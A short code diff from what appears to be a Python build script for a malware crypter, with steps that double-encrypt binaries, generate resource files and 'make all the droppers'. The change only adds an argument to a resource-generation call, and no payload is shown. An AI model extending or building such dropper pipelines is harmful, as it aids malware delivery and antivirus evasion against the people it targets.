@@ -109,7 +109,7 @@ else:
 
 print("Second encryptor used:", cpp_file2)
                                                                                                                         #3 make the res.rc folders
-GenerateRES.generate_all_resources("generated/double_encrypted_binaries","generated/resfiles" )
+GenerateRES.generate_all_resources("generated/double_encrypted_binaries","generated/resfiles",3 )
 
 # Iterate over all .rc files
 for rc_file in os.listdir("generated/resfiles"):                                                                        #4 make all the droppers
